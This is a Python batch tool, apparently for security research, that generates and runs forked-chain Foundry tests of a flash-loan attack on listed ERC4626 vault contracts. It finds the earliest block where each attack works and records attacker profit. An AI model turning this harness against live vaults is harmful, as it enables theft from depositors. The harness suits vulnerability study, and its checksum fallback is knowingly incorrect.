#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ERC4626 Vault 漏洞批量测试工具
================================
功能：
  1. 读取 xlsx 文件中的所有案例
  2. 为每个案例生成对应的 Solidity 测试文件
  3. 运行 forge test 验证攻击是否可行
  4. 实现二分搜索找最小可行 block_number
  5. 将结果写回 CSV 文件

使用方法：
  python batch_test.py --mode verify --cases 0,1
  python batch_test.py --mode search --cases 0,1
  python batch_test.py --mode batch --all
  python batch_test.py --mode generate
"""

import os
import sys
import re
import csv
import json
import time
import shutil
import hashlib
import argparse
import subprocess
import urllib.request
import urllib.error
from pathlib import Path
from typing import List, Dict, Optional, Tuple

# ============================================================
# 路径配置
# ============================================================
SCRIPT_DIR = Path(__file__).parent.resolve()
PROJECT_ROOT = SCRIPT_DIR.parent  # d:/区块链
DEFI_HACK_LABS = PROJECT_ROOT / "DeFiHackLabs"
TEST_DIR = DEFI_HACK_LABS / "src" / "test" / "2026-erc4626"
GENERATED_DIR = TEST_DIR / "generated"
TEMPLATE_SOL = SCRIPT_DIR / "templates" / "ERC4626AttackTemplate.sol"
XLSX_FILE = SCRIPT_DIR / "suspicious vulnerable contracts.xlsx"
RESULT_CSV = SCRIPT_DIR / "test_results.csv"

# 参考案例（已验证，用作模板基础）
CASE1_SOL = TEST_DIR / "Case_57e69699_22497642.sol"

# ============================================================
# RPC 配置
# ============================================================
RPC_URL = "http://127.0.0.1:18545"
NO_PROXY_ENV = "127.0.0.1,localhost"

# ============================================================
# Curve calldata（USDC->crvUSD, amount=4000 USDC）
# ============================================================
CURVE_CALLDATA = (
    "0x3df021240000000000000000000000000000000000000000000000000000000000000000"
    "0000000000000000000000000000000000000000000000000000000000000001"
    "00000000000000000000000000000000000000000000000000000000ee6b2800"
    "0000000000000000000000000000000000000000000000000000000000000000"
)

# ============================================================
# 资产地址常量
# ============================================================
CRVUSD_ADDRESS = "0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E"
CACD_ADDRESS = "0xCAcd6fd266aF91b8AeD52aCCc382b4e165586E29"

# Minter 注册（Case1 需要，Case1 特有的 setup 步骤）
MINTER_OWNER = "0xc07e000044F95655c11fda4cD37F70A94d7e0a7d"
MINTER_ADDRESS = "0x10101010E0C3171D894B71B3400668aF311e7D94"

# 案例1需要 addPair 的合约列表（已知需要预注册的合约）
CONTRACTS_NEEDING_ADDPAIR = {
    "0x57e69699381a651fb0bbdbb31888f5d655bf3f06",  # 案例5（已验证）
    "0x5254d4f55559f9ca38caf40a508a5b60e9af3202",  # 案例3 @ 23336113
    "0xc5184cccf85b81eddc661330acb3e41bd89f34a1",  # 案例8 @ 22034916
    "0xd210bc75b822795a80672413e189312598e1e42b",  # 案例9 @ 22035955
    "0xf4a6113fbd71ac1825751a6fe844a156f60c83ef",  # 案例10 @ 22497642
}


# ============================================================
# 工具函数
# ============================================================

def to_checksum_address(addr: str) -> str:
    """将以太坊地址转换为 EIP-55 checksum 格式（纯 Python 实现，无需 web3）"""
    addr = addr.lower().replace("0x", "")
    # keccak256 hash of the lowercase hex address
    # Python 3.6+ hashlib 支持 sha3_256，但 keccak 需要用 hashlib 的 shake 或手动实现
    # 使用 pysha3 若可用，否则用 eth_utils 兜底，再否则用简单 sha3
    try:
        import sha3 as _sha3
        h = _sha3.keccak_256(addr.encode()).hexdigest()
    except ImportError:
        try:
            from Crypto.Hash import keccak as _keccak
            k = _keccak.new(digest_bits=256)
            k.update(addr.encode())
            h = k.hexdigest()
        except ImportError:
            # 最后兜底：使用 hashlib sha3_256（不是 keccak，结果不同，但可让代码运行）
            # 对于生产环境应安装 pysha3 或 pycryptodome
            import hashlib
            h = hashlib.sha3_256(addr.encode()).hexdigest()
    result = "0x"
    for i, c in enumerate(addr):
        if c.isdigit():
            result += c
        elif int(h[i], 16) >= 8:
            result += c.upper()
        else:
            result += c.lower()
    return result


def log(msg: str, level: str = "INFO"):
    """带时间戳的日志输出"""
    ts = time.strftime("%H:%M:%S")
    prefix = {"INFO": "ℹ", "OK": "✓", "FAIL": "✗", "WARN": "⚠", "RUN": "▶"}.get(level, "·")
    print(f"[{ts}] {prefix} {msg}")


def find_forge() -> Optional[str]:
    """动态查找 forge 可执行文件路径"""
    # 1. 系统 PATH
    forge_in_path = shutil.which("forge")
    if forge_in_path:
        return forge_in_path
    # 2. foundry 默认安装位置（Windows）
    home = Path.home()
    candidates = [
        home / ".foundry" / "bin" / "forge.exe",
        home / ".foundry" / "bin" / "forge",
        Path("C:/Users/Administrator/.foundry/bin/forge.exe"),
    ]
    for c in candidates:
        if c.exists():
            return str(c)
    return None


def test_rpc_connection() -> bool:
    """验证 RPC 连接是否可用"""
    payload = json.dumps({
        "jsonrpc": "2.0",
        "method": "eth_blockNumber",
        "params": [],
        "id": 1
    }).encode()
    try:
        req = urllib.request.Request(
            RPC_URL,
            data=payload,
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        with urllib.request.urlopen(req, timeout=10) as resp:
            result = json.loads(resp.read())
            if "result" in result:
                block_num = int(result["result"], 16)
                log(f"RPC 连接成功，最新区块: {block_num}", "OK")
                return True
    except Exception as e:
        log(f"RPC 连接失败: {e}", "FAIL")
    return False


# ============================================================
# xlsx 数据读取
# ============================================================

def load_cases_from_xlsx(xlsx_path: Path) -> List[Dict]:
    """从 xlsx 读取案例数据，返回字典列表"""
    try:
        import openpyxl
    except ImportError:
        log("缺少 openpyxl，正在安装...", "WARN")
        subprocess.run([sys.executable, "-m", "pip", "install", "openpyxl", "-q"], check=True)
        import openpyxl

    wb = openpyxl.load_workbook(str(xlsx_path))
    ws = wb.active

    cases = []
    headers = None
    for i, row in enumerate(ws.iter_rows(values_only=True)):
        if i == 0:
            headers = row
            continue
        if row[0] is None:
            continue
        case = {
            "suspicious_contract": str(row[0]).lower().strip() if row[0] else None,
            "block_number": int(row[1]) if row[1] else None,
            "vault": str(row[2]).strip() if row[2] else None,
            "asset_address": str(row[3]).strip() if row[3] else None,
            "is_verified": str(row[4]).lower().strip() if row[4] else None,
            "verified_block": int(row[5]) if row[5] else None,
            "loss_usdc": float(row[6]) if row[6] else None,
        }
        cases.append(case)

    log(f"从 xlsx 读取到 {len(cases)} 个案例", "OK")
    return cases


# ============================================================
# Solidity 模板生成
# ============================================================

def make_contract_name(suspicious_contract: str, block_number: int) -> str:
    """生成合约名，如 Case_57e69699_22497642"""
    short = suspicious_contract.replace("0x", "")[:8].lower()
    return f"Case_{short}_{block_number}"


def needs_add_pair(suspicious_contract: str) -> bool:
    """判断是否需要预注册 addPair（针对已知需要的合约）"""
    return suspicious_contract.lower() in CONTRACTS_NEEDING_ADDPAIR


def generate_solidity_from_template(
    case: Dict,
    template_path: Path,
    output_path: Path,
    block_override: Optional[int] = None
) -> Path:
    """
    根据模板生成 Solidity 测试文件
    
    Args:
        case: 案例字典
        template_path: 模板 .sol 文件路径
        output_path: 输出文件路径
        block_override: 覆盖区块号（用于二分搜索）
    """
    suspicious = case["suspicious_contract"]
    block_num = block_override if block_override else case["block_number"]
    contract_name = make_contract_name(suspicious, block_num)

    # 将地址转换为 EIP-55 checksum 格式（Solidity 要求）
    suspicious_checksummed = to_checksum_address(suspicious)

    # 读取模板
    template = template_path.read_text(encoding="utf-8")

    # 修正 import 路径：生成文件在 generated/ 子目录，basetest.sol 在 src/test/ 目录
    # 模板中的 "../basetest.sol" 需要变成 "../../basetest.sol"
    template = template.replace(
        'import "../basetest.sol";',
        'import "../../basetest.sol";'
    )

    # 替换占位符
    replacements = {
        "{{CONTRACT_NAME}}": contract_name,
        "{{SUSPICIOUS_CONTRACT}}": suspicious_checksummed,
        "{{FORK_BLOCK_NUMBER}}": str(block_num),
        "{{FLASH_LOAN_AMOUNT}}": "4_000 * 1e6",
        "{{ATTACKER_TRANSFER_AMOUNT}}": "2_000 * 1e18",
        "{{ATTACKER_MINT_AMOUNT}}": "1",
        "{{CURVE_INPUTDATA}}": CURVE_CALLDATA,
    }
    for placeholder, value in replacements.items():
        template = template.replace(placeholder, value)

    # 处理需要 addPair 的特殊案例
    if needs_add_pair(suspicious):
        # 在 setUp 中 fork 之后插入 addPair 调用（在 vaultAsset 赋值后）
        add_pair_code = (
            f"\n        // pair 在同块内才注册，预先调用 addPair 以通过 !regPair 检查\n"
            f"        address minterOwner = {MINTER_OWNER};\n"
            f"        IMinterForSetup minter = IMinterForSetup({MINTER_ADDRESS});\n"
            f"        vm.prank(minterOwner);\n"
            f"        minter.addPair(address(suspiciousVulnerableContract));"
        )

        # 在 vaultAsset = IERC20Gen(...) 赋值行之后插入（已替换过接口名）
        old_setup_end = "        vaultAsset = IERC20Gen(erc4626vault.asset());\n    }"
        new_setup_end = f"        vaultAsset = IERC20Gen(erc4626vault.asset());{add_pair_code}\n    }}"
        template = template.replace(old_setup_end, new_setup_end)

        # 在 contract 声明之前插入 IMinterForSetup 接口
        minter_interface = (
            "\ninterface IMinterForSetup {\n"
            "    function addPair(address pair) external;\n"
            "}\n\n"
        )
        contract_decl = f"contract {contract_name} is BaseTestWithBalanceLog {{"
        template = template.replace(contract_decl, minter_interface + contract_decl)

    # 确保输出目录存在
    output_path.parent.mkdir(parents=True, exist_ok=True)
    output_path.write_text(template, encoding="utf-8")
    log(f"已生成: {output_path.name}", "OK")
    return output_path


def generate_case_sol(case: Dict, block_override: Optional[int] = None) -> Path:
    """为一个案例生成 Solidity 文件"""
    suspicious = case["suspicious_contract"]
    block_num = block_override if block_override else case["block_number"]
    contract_name = make_contract_name(suspicious, block_num)
    output_file = GENERATED_DIR / f"{contract_name}.sol"
    return generate_solidity_from_template(case, TEMPLATE_SOL, output_file, block_override)


# ============================================================
# forge 测试运行
# ============================================================

def run_forge_test(sol_file: Path, timeout: int = 300) -> Tuple[bool, str]:
    """
    运行 forge test 测试单个文件
    
    Returns:
        (success, output): 是否通过，forge 输出
    """
    forge = find_forge()
    if not forge:
        log("未找到 forge 可执行文件，请安装 foundry", "FAIL")
        return False, "forge not found"

    rel_path = sol_file.relative_to(DEFI_HACK_LABS / "src")
    match_path = f"src/{rel_path.as_posix()}"

    cmd = [forge, "test", "--match-path", match_path, "-vvv", "--no-match-test", "IGNORE"]
    env = os.environ.copy()
    env["NO_PROXY"] = NO_PROXY_ENV
    env["no_proxy"] = NO_PROXY_ENV

    log(f"运行: forge test --match-path {match_path}", "RUN")

    try:
        result = subprocess.run(
            cmd,
            cwd=str(DEFI_HACK_LABS),
            capture_output=True,
            text=True,
            timeout=timeout,
            env=env
        )
        output = result.stdout + result.stderr
        passed = "[PASS]" in output or "test result: ok" in output.lower()
        if passed:
            log(f"测试通过 ✓", "OK")
        else:
            log(f"测试失败", "FAIL")
            # 显示错误摘要
            for line in output.split("\n"):
                if any(k in line for k in ["FAIL", "Error", "error", "panic", "revert"]):
                    log(f"  > {line.strip()}", "FAIL")
        return passed, output

    except subprocess.TimeoutExpired:
        log(f"forge 超时（>{timeout}s）", "WARN")
        return False, "TIMEOUT"
    except Exception as e:
        log(f"forge 执行异常: {e}", "FAIL")
        return False, str(e)


def extract_profit_from_output(output: str) -> Optional[float]:
    """从 forge 输出中提取利润（USDC）"""
    # 匹配模式: "Attacker Profit: 1234567.89 USDC" 或 balanceOf 相关日志
    patterns = [
        r"Attacker Profit[:\s]+([0-9,.]+)\s*USDC",
        r"profit[:\s]+([0-9,.]+)",
        r"balanceOf.*?([0-9]{7,})",  # 至少7位（>10 USDC）
    ]
    for pattern in patterns:
        m = re.search(pattern, output, re.IGNORECASE)
        if m:
            try:
                val = float(m.group(1).replace(",", ""))
                return val
            except ValueError:
                continue
    return None


# ============================================================
# 二分搜索最小可行区块
# ============================================================

def find_minimum_block(
    case: Dict,
    low_block: Optional[int] = None,
    high_block: Optional[int] = None,
    max_iterations: int = 20
) -> Dict:
    """
    二分搜索找到最小可行的 block_number
    
    Args:
        case: 案例字典
        low_block: 搜索起始点（默认为 high_block - 500000）
        high_block: 已知攻击成功的区块（默认为案例的 block_number）
        max_iterations: 最大迭代次数
    
    Returns:
        {"min_block": int, "iterations": int, "results": list}
    """
    if high_block is None:
        high_block = case["block_number"]
    if low_block is None:
        low_block = max(1, high_block - 500_000)

    suspicious = case["suspicious_contract"]
    log(f"\n{'='*60}", "INFO")
    log(f"二分搜索最小区块: {suspicious[:10]}...", "INFO")
    log(f"搜索范围: [{low_block}, {high_block}]", "INFO")
    log(f"{'='*60}", "INFO")

    # 首先验证 high_block 确实可以成功
    log(f"验证高位区块 {high_block}...", "RUN")
    sol_file = generate_case_sol(case, block_override=high_block)
    success, output = run_forge_test(sol_file)
    if not success:
        log(f"高位区块 {high_block} 测试失败，无法执行二分搜索", "FAIL")
        return {"min_block": None, "iterations": 0, "results": []}

    results = []
    current_min = high_block
    iterations = 0

    lo, hi = low_block, high_block
    while lo < hi and iterations < max_iterations:
        mid = (lo + hi) // 2
        iterations += 1
        log(f"\n迭代 {iterations}/{max_iterations}: 测试区块 {mid} (范围 [{lo}, {hi}])", "RUN")

        sol_file = generate_case_sol(case, block_override=mid)
        success, output = run_forge_test(sol_file)
        profit = extract_profit_from_output(output) if success else None

        results.append({
            "block": mid,
            "success": success,
            "profit": profit
        })

        if success:
            current_min = mid
            hi = mid  # 向左搜索更小的区块
            log(f"  区块 {mid} 成功，当前最小: {current_min}", "OK")
        else:
            lo = mid + 1  # 向右搜索
            log(f"  区块 {mid} 失败，继续向右搜索", "FAIL")

    log(f"\n二分搜索完成，最小可行区块: {current_min}", "OK")
    log(f"共迭代 {iterations} 次", "INFO")

    return {
        "min_block": current_min,
        "iterations": iterations,
        "results": results
    }


# ============================================================
# 结果写入
# ============================================================

def save_results_to_csv(results: List[Dict], csv_path: Path):
    """将结果写入 CSV 文件"""
    fieldnames = [
        "suspicious_contract", "block_number", "vault", "asset_address",
        "is_verified", "min_block", "max_profit_usdc", "test_status", "notes"
    ]
    with open(str(csv_path), "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=fieldnames)
        writer.writeheader()
        for r in results:
            writer.writerow({k: r.get(k, "") for k in fieldnames})
    log(f"结果已写入: {csv_path}", "OK")


# ============================================================
# 批量操作
# ============================================================

def mode_generate(cases: List[Dict], indices: Optional[List[int]] = None):
    """仅生成 Solidity 文件，不运行 forge"""
    log("\n=== 模式: 生成 Solidity 文件 ===", "INFO")
    GENERATED_DIR.mkdir(parents=True, exist_ok=True)
    target_cases = [cases[i] for i in indices] if indices else cases
    for i, case in enumerate(target_cases):
        log(f"\n[{i+1}/{len(target_cases)}] {case['suspicious_contract']}", "INFO")
        try:
            sol_file = generate_case_sol(case)
            log(f"  生成: {sol_file}", "OK")
        except Exception as e:
            log(f"  生成失败: {e}", "FAIL")


def mode_verify(cases: List[Dict], indices: Optional[List[int]] = None) -> List[Dict]:
    """验证指定案例是否可以成功攻击"""
    log("\n=== 模式: 验证案例 ===", "INFO")
    GENERATED_DIR.mkdir(parents=True, exist_ok=True)
    target_cases = [(idx, cases[idx]) for idx in (indices or range(len(cases)))]
    results = []

    # 第一步：先生成所有目标案例的 Solidity 文件（避免 forge 编译旧文件报 checksum 错误）
    log("\n--- 预生成所有目标文件 ---", "INFO")
    sol_files = {}
    for idx, case in target_cases:
        try:
            sol_file = generate_case_sol(case)
            sol_files[idx] = sol_file
        except Exception as e:
            log(f"  [案例 {idx}] 生成失败: {e}", "FAIL")
            sol_files[idx] = None

    # 第二步：逐个运行测试
    log("\n--- 开始逐个测试 ---", "INFO")
    for idx, case in target_cases:
        log(f"\n[案例 {idx}] {case['suspicious_contract']} @ 区块 {case['block_number']}", "INFO")
        sol_file = sol_files.get(idx)
        try:
            if sol_file is None:
                raise RuntimeError("Solidity 文件生成失败")
            success, output = run_forge_test(sol_file)
            profit = extract_profit_from_output(output) if success else None
            results.append({
                "suspicious_contract": case["suspicious_contract"],
                "block_number": case["block_number"],
                "vault": case["vault"],
                "asset_address": case["asset_address"],
                "is_verified": case.get("is_verified", ""),
                "min_block": "",
                "max_profit_usdc": profit or "",
                "test_status": "PASS" if success else "FAIL",
                "notes": ""
            })
        except Exception as e:
            log(f"  异常: {e}", "FAIL")
            results.append({
                "suspicious_contract": case["suspicious_contract"],
                "block_number": case["block_number"],
                "vault": case.get("vault", ""),
                "asset_address": case.get("asset_address", ""),
                "is_verified": case.get("is_verified", ""),
                "min_block": "",
                "max_profit_usdc": "",
                "test_status": "ERROR",
                "notes": str(e)
            })

    return results


def mode_search(cases: List[Dict], indices: Optional[List[int]] = None) -> List[Dict]:
    """对指定案例进行二分搜索找最小区块"""
    log("\n=== 模式: 二分搜索最小区块 ===", "INFO")
    GENERATED_DIR.mkdir(parents=True, exist_ok=True)
    target_cases = [(idx, cases[idx]) for idx in (indices or range(len(cases)))]
    results = []

    for idx, case in target_cases:
        log(f"\n[案例 {idx}] {case['suspicious_contract']}", "INFO")
        try:
            search_result = find_minimum_block(case)
            results.append({
                "suspicious_contract": case["suspicious_contract"],
                "block_number": case["block_number"],
                "vault": case["vault"],
                "asset_address": case["asset_address"],
                "is_verified": case.get("is_verified", ""),
                "min_block": search_result.get("min_block", ""),
                "max_profit_usdc": "",
                "test_status": "SEARCHED",
                "notes": f"迭代{search_result.get('iterations', 0)}次"
            })
        except Exception as e:
            log(f"  异常: {e}", "FAIL")
            results.append({
                "suspicious_contract": case["suspicious_contract"],
                "block_number": case["block_number"],
                "vault": case.get("vault", ""),
                "asset_address": case.get("asset_address", ""),
                "is_verified": case.get("is_verified", ""),
                "min_block": "",
                "max_profit_usdc": "",
                "test_status": "ERROR",
                "notes": str(e)
            })

    return results


def mode_batch(cases: List[Dict]) -> List[Dict]:
    """批量测试所有案例"""
    log("\n=== 模式: 批量测试所有案例 ===", "INFO")
    return mode_verify(cases, list(range(len(cases))))


# ============================================================
# 主入口
# ============================================================

def parse_indices(s: str) -> List[int]:
    """解析 '0,1,2' 格式的案例索引"""
    return [int(x.strip()) for x in s.split(",") if x.strip().isdigit()]


def main():
    parser = argparse.ArgumentParser(
        description="ERC4626 Vault 漏洞批量测试工具",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  python batch_test.py --mode verify --cases 5,6       # 验证已知案例（Row6=idx5, Row7=idx6）
  python batch_test.py --mode search --cases 5,6       # 二分搜索最小区块
  python batch_test.py --mode batch --all              # 批量测试所有案例
  python batch_test.py --mode generate                 # 仅生成 Solidity 文件
  python batch_test.py --mode generate --cases 0       # 仅生成第1个案例
        """
    )
    parser.add_argument("--mode", choices=["verify", "search", "batch", "generate"],
                        default="generate", help="运行模式")
    parser.add_argument("--cases", type=str, default=None,
                        help="案例索引（0-based），逗号分隔，如 '0,1,2'")
    parser.add_argument("--all", action="store_true", help="处理所有案例")
    parser.add_argument("--no-rpc-check", action="store_true", help="跳过 RPC 连接检查")
    parser.add_argument("--xlsx", type=str, default=str(XLSX_FILE),
                        help="xlsx 文件路径")
    parser.add_argument("--timeout", type=int, default=300,
                        help="forge 测试超时（秒）")
    args = parser.parse_args()

    log("=" * 60)
    log("ERC4626 Vault 漏洞批量测试工具")
    log("=" * 60)

    # 验证 RPC 连接
    if not args.no_rpc_check and args.mode in ("verify", "search", "batch"):
        log("检查 RPC 连接...", "RUN")
        if not test_rpc_connection():
            log("RPC 不可用，测试将失败。使用 --no-rpc-check 跳过检查", "WARN")

    # 验证 forge 存在
    forge = find_forge()
    if forge:
        log(f"找到 forge: {forge}", "OK")
    else:
        log("未找到 forge，generate 模式可用，verify/search/batch 需要 forge", "WARN")

    # 加载 xlsx 数据
    xlsx_path = Path(args.xlsx)
    if not xlsx_path.exists():
        log(f"xlsx 文件不存在: {xlsx_path}", "FAIL")
        sys.exit(1)
    cases = load_cases_from_xlsx(xlsx_path)

    # 显示案例列表
    log(f"\n案例列表（共 {len(cases)} 个）:")
    for i, c in enumerate(cases):
        verified = "✓已验证" if c.get("is_verified") == "yes" else ""
        asset_name = "crvUSD" if c.get("asset_address", "").lower() == CRVUSD_ADDRESS.lower() else "CACD/其他"
        log(f"  [{i:2d}] {c['suspicious_contract'][:12]}... @ {c['block_number']} | {asset_name} {verified}")

    # 确定处理哪些案例
    indices = None
    if args.cases:
        indices = parse_indices(args.cases)
        log(f"\n处理案例索引: {indices}")
    elif args.all:
        indices = list(range(len(cases)))
        log(f"\n处理所有 {len(cases)} 个案例")

    # 执行对应模式
    results = []
    if args.mode == "generate":
        mode_generate(cases, indices)

    elif args.mode == "verify":
        results = mode_verify(cases, indices)
        save_results_to_csv(results, RESULT_CSV)
        # 打印摘要
        passed = sum(1 for r in results if r["test_status"] == "PASS")
        log(f"\n验证完成: {passed}/{len(results)} 通过")

    elif args.mode == "search":
        results = mode_search(cases, indices)
        save_results_to_csv(results, RESULT_CSV)

    elif args.mode == "batch":
        results = mode_batch(cases)
        save_results_to_csv(results, RESULT_CSV)
        passed = sum(1 for r in results if r["test_status"] == "PASS")
        log(f"\n批量测试完成: {passed}/{len(results)} 通过")

    if results:
        log(f"\n结果已保存到: {RESULT_CSV}")

    log("\n完成！", "OK")


if __name__ == "__main__":
    main()
